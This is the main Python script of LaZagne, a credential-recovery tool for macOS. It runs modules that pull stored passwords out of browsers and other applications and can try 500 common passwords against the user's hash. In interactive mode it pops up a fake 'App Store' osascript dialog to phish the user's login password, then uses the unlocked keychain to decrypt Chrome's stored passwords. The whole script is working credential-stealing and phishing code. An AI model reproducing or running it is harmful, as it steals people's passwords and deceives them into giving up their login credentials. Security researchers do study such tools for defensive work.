# -*- coding: utf-8 -*- 
# !/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)

import subprocess
import traceback
import argparse
import logging
import getpass
import json
import sys
import os
import time

# Configuration
from lazagne.config.write_output import parse_json_result_to_buffer, print_debug, StandardOutput
from lazagne.config.manage_modules import get_categories, get_modules
from lazagne.config.constant import constant

from lazagne.softwares.browsers.mozilla import Mozilla
from lazagne.softwares.browsers.chrome import Chrome


# Object used to manage the output / write functions (cf write_output file)
constant.st = StandardOutput()

# Tab containing all passwords
stdoutRes = []
modules = {}

# Define a dictionary for all modules
for category_name in get_categories():
    modules[category_name] = {}

# Add all modules to the dictionary
for module in get_modules():
    modules[module.category][module.options['dest']] = module


def output():
    if args['output']:
        if os.path.isdir(args['output']):
            constant.folder_name = args['output']
        else:
            print_debug('ERROR', '[!] Specify a directory, not a file !')

    if args['write_normal']:
        constant.output = 'txt'

    if args['write_json']:
        constant.output = 'json'

    if args['write_all']:
        constant.output = 'all'

    if constant.output:
        if constant.output != 'json':
            constant.st.write_header()


def quiet_mode():
    if args['quiet']:
        constant.quiet_mode = True


def verbosity():
    # Write on the console + debug file
    if args['verbose'] == 0:
        level = logging.CRITICAL
    elif args['verbose'] == 1:
        level = logging.INFO
    elif args['verbose'] >= 2:
        level = logging.DEBUG

    formatter = logging.Formatter(fmt='%(message)s')
    stream = logging.StreamHandler(sys.stdout)
    stream.setFormatter(formatter)
    root = logging.getLogger()
    root.setLevel(level)
    # If other logging are set
    for r in root.handlers:
        r.setLevel(logging.CRITICAL)
    root.addHandler(stream)
    del args['verbose']


def run_cmd(cmd):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    result, _ = p.communicate()
    if result:
        return result
    else:
        return ''


def manage_advanced_options():
    if 'password' in args:
        constant.user_password = args['password']

    if 'attack' in args:
        constant.dictionary_attack = args['attack']


def launch_module(module):
    modules_to_launch = []
    try:
        # Launch only a specific module
        for i in args:
            if args[i] and i in module:
                modules_to_launch.append(i)
    except Exception:
        # If no args
        pass

    # Launch all modules
    if not modules_to_launch:
        modules_to_launch = module

    for i in modules_to_launch:
        try:
            constant.st.title_info(i.capitalize())  # print title
            pwd_found = module[i].run(i.capitalize())  # run the module
            constant.st.print_output(i.capitalize(), pwd_found)  # print the results

            # Return value - not used but needed
            yield True, i.capitalize(), pwd_found
        except Exception:
            error_message = traceback.format_exc()
            print_debug('DEBUG', error_message)
            yield False, i.capitalize(), error_message


# Write output to file (json and txt files)
def write_in_file(result):
    if constant.output == 'json' or constant.output == 'all':
        try:
            # Human readable Json format
            pretty_json = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
            with open(os.path.join(constant.folder_name, constant.file_name_results + '.json'), 'a+b') as f:
                f.write(pretty_json.decode('unicode-escape').encode('UTF-8'))
            constant.st.do_print(
                '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json')
        except Exception as e:
            print_debug('ERROR', 'Error writing the output file: %s' % e)

    if constant.output == 'txt' or constant.output == 'all':
        try:
            with open(os.path.join(constant.folder_name, constant.file_name_results + '.txt'), 'a+b') as f:
                a = parse_json_result_to_buffer(result)
                f.write(a.encode("UTF-8"))
            constant.st.write_footer()
            constant.st.do_print(
                '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt')
        except Exception as e:
            print_debug('ERROR', 'Error writing the output file: %s' % e)


# Run module
def runModule(category_selected):
    categories = [category_selected] if category_selected != 'all' else get_categories()
    for category in categories:
        for r in launch_module(modules[category]):
            yield r


# print user when verbose mode is enabled (without verbose mode the user is printed on the write_output python file)
def print_user(user):
    if logging.getLogger().isEnabledFor(logging.INFO):
        constant.st.print_user(user)


def get_safe_storage_key(key):
    try:
        for passwords in constant.keychains_pwds:
            if key in passwords['Service']:
                return passwords['Password']
    except Exception:
        pass

    return False


def runLaZagne(category_selected='all', interactive=False):
    user = getpass.getuser()
    constant.finalResults = {}
    constant.finalResults['User'] = user

    # Could be easily changed
    application = 'App Store'

    i = 0
    while True:
        # Run all modules
        for r in runModule(category_selected):
            yield r

        # Execute once if not interactive,
        # Otherwise print the dialog box until the user keychain is unlocked (so the user password has been found)
        if not interactive or (interactive and constant.user_keychain_find):
            break

        elif interactive and constant.user_keychain_find == False:
            msg = ''
            if i == 0:
                msg = 'App Store requires your password to continue.'
            else:
                msg = 'Password incorrect! Please try again.'

            # Code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
            cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" ' \
                  'to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & ' \
                  'return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(
                        application=application, msg=msg
            )
            pwd = run_cmd(cmd)
            if pwd.split(':')[1].startswith('OK'):
                constant.user_password = pwd.split(':')[2].strip()

        i += 1

        # If the user enter 10 bad password, be nice with him and break the loop
        if i > 10:
            break

    # If keychains has been decrypted, launch again some module
    chrome_key = get_safe_storage_key('Chrome Safe Storage')
    if chrome_key:
        for r in launch_module({'chrome': Chrome(safe_storage_key=chrome_key)}):
            yield r

    stdoutRes.append(constant.finalResults)


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--version', action='version', version='Version ' + str(constant.CURRENT_VERSION),
                        help='laZagne version')

    # ------------------------------------------- Permanent options ------------------------------------------
    # Version and verbosity
    PPoptional = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION)
    )
    PPoptional._optionals.title = 'optional arguments'
    PPoptional.add_argument('-i', '--interactive', default=False, action='store_true',
                            help='will prompt a window to the user')
    PPoptional.add_argument('-password', dest='password', action='store',
                            help='user password used to decrypt the keychain')
    PPoptional.add_argument('-attack', dest='attack', action='store_true',
                            help='500 well known passwords used to check the user hash (could take a while)')
    PPoptional.add_argument('-v', dest='verbose', action='count', help='increase verbosity level', default=0)
    PPoptional.add_argument('-quiet', dest='quiet', action='store_true',
                            help='quiet mode: nothing is printed to the output', default=False, )

    # Output
    PWrite = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION)
    )
    PWrite._optionals.title = 'Output'
    PWrite.add_argument('-oN', dest='write_normal', action='store_true', help='output file in a readable format')
    PWrite.add_argument('-oJ', dest='write_json', action='store_true', help='output file in a json format')
    PWrite.add_argument('-oA', dest='write_all', action='store_true', help='output file in all format')
    PWrite.add_argument('-output', dest='output', action='store', help='destination path to store results (default:.)',
                        default='.')

    # -------------------------------- Add options and suboptions to all modules ------------------------------
    all_subparser = []
    categories = get_categories()
    for c in categories:
        categories[c]['parser'] = argparse.ArgumentParser(
            add_help=False,
            formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION)
        )
        categories[c]['parser']._optionals.title = categories[c]['help']

        # Manage options
        categories[c]['subparser'] = []
        for module in modules[c]:
            m = modules[c][module]
            categories[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'],
                                               help=m.options['help'])

            # Manage all sub options by modules
            if m.suboptions:
                tmp = []
                for sub in m.suboptions:
                    tmp_subparser = argparse.ArgumentParser(
                        add_help=False,
                        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION)
                    )
                    tmp_subparser._optionals.title = sub['title']
                    if 'type' in sub:
                        tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'],
                                                   dest=sub['dest'], help=sub['help'])
                    else:
                        tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'],
                                                   help=sub['help'])
                    tmp.append(tmp_subparser)
                    all_subparser.append(tmp_subparser)
                categories[c]['subparser'] += tmp

    # ------------------------------------------- Print all -------------------------------------------
    parents = [PPoptional] + all_subparser + [PWrite]
    dic = {'all': {'parents': parents, 'help': 'Run all modules', 'func': runModule}}
    for c in categories:
        parser_tab = [PPoptional, categories[c]['parser']]
        if 'subparser' in categories[c]:
            if categories[c]['subparser']:
                parser_tab += categories[c]['subparser']
        parser_tab += [PWrite]
        dic_tmp = {c: {'parents': parser_tab, 'help': 'Run %s module' % c, 'func': runModule}}
        dic = dict(dic.items() + dic_tmp.items())

    subparsers = parser.add_subparsers(help='Choose a main command')
    for d in dic:
        subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(
                                                                                                func=dic[d]['func'],
                                                                                                auditType=d)

    # ------------------------------------------- Parse arguments -------------------------------------------

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = dict(parser.parse_args()._get_kwargs())
    arguments = parser.parse_args()
    category_selected = args['auditType']

    # Define constant variables
    output()
    verbosity()
    manage_advanced_options()

    quiet_mode()

    # Print the title
    constant.st.first_title()

    start_time = time.time()

    for r in runLaZagne(category_selected, arguments.interactive):
        pass

    write_in_file(stdoutRes)
    constant.st.print_footer(elapsed_time=str(time.time() - start_time))
